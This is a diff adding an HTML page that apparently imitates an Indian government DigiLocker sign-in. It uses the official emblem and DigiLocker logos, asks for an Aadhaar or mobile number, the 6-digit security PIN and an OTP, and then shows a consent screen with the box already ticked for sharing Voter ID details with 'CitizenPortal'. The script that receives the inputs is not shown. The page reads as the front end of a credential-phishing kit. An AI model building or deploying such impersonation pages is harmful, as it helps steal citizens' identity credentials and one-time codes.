@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Citizen Services Portal</title>
+    <link rel="stylesheet" href="css/login.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="app-container">
+        <header class="gov-header">
+            <div class="header-left">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Emblem_of_India.svg" alt="Emblem" class="emblem">
+                <div class="header-text">
+                    <span class="dept-name">E-Governance Services</span>
+                    <span class="govt-name">Government of India</span>
+                </div>
+            </div>
+            <div class="header-right">
+                <div class="cp-brand">
+                    <span>CitizenPortal</span>
+                    <div class="cp-logo">CP</div>
+                </div>
+            </div>
+        </header>
+
+        <main class="auth-viewport">
+            <div id="step-1" class="auth-card">
+                <div class="dl-brand">
+                    <img src="https://www.digilocker.gov.in/assets/img/digilocker_logo.png" alt="DigiLocker">
+                </div>
+                <h2>Sign In to your account</h2>
+                <p class="instr">Enter your Aadhaar/Mobile number and 6-digit PIN</p>
+
+                <div class="input-field">
+                    <input type="number" id="identifier" placeholder="Aadhaar / Mobile Number">
+                </div>
+                <div class="input-field">
+                    <input type="password" id="pin" placeholder="6-digit Security PIN" maxlength="6">
+                </div>
+                
+                <button id="to-otp-btn" class="dl-primary-btn">Sign In</button>
+                <div class="dl-links">
+                    <a href="#">Forgot security PIN?</a>
+                </div>
+            </div>
+
+            <div id="step-2" class="auth-card hidden">
+                <div class="dl-brand">
+                    <img src="https://www.digilocker.gov.in/assets/img/digilocker_logo.png" alt="DigiLocker">
+                </div>
+                <h2>Verify OTP</h2>
+                <p class="instr">DigiLocker has sent a temporary OTP to your registered mobile (******7890).</p>
+
+                <div class="otp-row">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                    <input type="number" class="otp-box" maxlength="1">
+                </div>
+
+                <button id="to-consent-btn" class="dl-primary-btn">Submit</button>
+                <p class="resend">Wait <span id="timer">00:59</span> to resend OTP</p>
+            </div>
+
+            <div id="step-3" class="consent-screen hidden">
+                <div class="dl-oauth-header">
+                    <img src="https://www.digilocker.gov.in/assets/img/digilocker_logo.png" alt="DigiLocker" class="dl-logo-mini">
+                    <div class="header-right-meta">
+                        <span class="portal-tag">CitizenPortal</span>
+                        <div class="cp-square">CP</div>
+                    </div>
+                </div>
+            
+                <div class="consent-scroll-area">
+                    <div class="user-auth-strip">
+                        <div class="user-initials">JS</div>
+                        <div class="user-detail">
+                            <span class="u-name">JOHN SHARMA</span>
+                            <span class="u-meta">Verified via Aadhaar</span>
+                        </div>
+                    </div>
+            
+                    <div class="consent-main">
+                        <p class="request-intro"><b>CitizenPortal</b> is requesting to access your DigiLocker Account to pull your <b>Issued Documents</b>.</p>
+                        
+                        <div class="doc-list-item">
+                            <div class="doc-icon-wrap">
+                                <img src="https://www.digilocker.gov.in/assets/img/issued_doc.png" alt="Doc" onerror="this.src='https://img.icons8.com/color/48/checked-user-male.png'">
+                            </div>
+                            <div class="doc-content">
+                                <span class="doc-label">Voter Identity Card (EPIC)</span>
+                                <span class="doc-provider">Election Commission of India (ECI)</span>
+                                <span class="doc-fields">Fields: Name, DOB, Gender, EPIC_No, Address</span>
+                            </div>
+                        </div>
+            
+                        <div class="purpose-block">
+                            <span class="purpose-label">Purpose of Request:</span>
+                            <p>Identity verification for Voter Registration and Service Access through CitizenPortal via Zero-Knowledge Verification.</p>
+                        </div>
+            
+                        <div class="validity-block">
+                            <span>Verification Valid up to: <b>31-Dec-2025</b></span>
+                        </div>
+            
+                        <div class="consent-checkbox-area">
+                            <input type="checkbox" id="consent-check" checked>
+                            <label for="consent-check">
+                                I hereby provide my consent to DigiLocker to share my Aadhaar/Identity data and document details with the requesting agency for the purpose mentioned above.
+                            </label>
+                        </div>
+                        
+                        <div class="legal-links">
+                            <a href="#">Terms and Conditions</a> | <a href="#">Privacy Policy</a>
+                        </div>
+                    </div>
+                </div>
+            
+                <div class="dl-actions-bar">
+                    <button id="deny-btn" class="btn-dl-deny">Deny</button>
+                    <button id="allow-btn" class="btn-dl-allow">Allow</button>
+                </div>
+            </div>
+
+            <div id="loader" class="loader-overlay hidden">
+                <div class="spinner"></div>
+                <p id="loader-msg">Verifying credentials...</p>
+            </div>
+        </main>
+    </div>
+
+    <script src="js/login.js"></script>
+</body>
+</html>
